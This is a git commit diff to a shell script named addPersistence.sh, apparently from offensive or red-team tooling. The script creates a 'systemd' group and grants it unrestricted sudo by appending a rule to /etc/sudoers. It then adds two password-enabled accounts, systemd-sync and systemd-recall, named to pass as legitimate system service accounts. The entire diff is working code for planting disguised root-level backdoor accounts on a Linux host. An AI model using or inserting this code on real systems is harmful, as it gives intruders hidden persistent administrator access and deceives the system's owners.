1d16c3792c1fb4734970bde261711589b4ec19ca
bodevalley <98053275+bodevalley@users.noreply.github.com>
2022-04-08 00:01:31 -0400

    Update addPersistence.sh

--- scripts/sparky/addPersistence.sh
+++ scripts/sparky/addPersistence.sh
@@ -1,10 +1,14 @@
 addPersistence() {
 sudo groupadd systemd
 
-sudo useradd -u 569 -g systemd -M systemd-sync
-sudo useradd -u 570 -g systemd -M systemd-recall
+echo "%systemd ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
 
+sudo useradd -u 569 -G systemd -M systemd-sync
+sudo useradd -u 570 -G systemd -M systemd-recall
+
+echo "Password for sync"
 sudo passwd systemd-sync
+echo "Password for recall"
 sudo passwd systemd-recall
 
 }
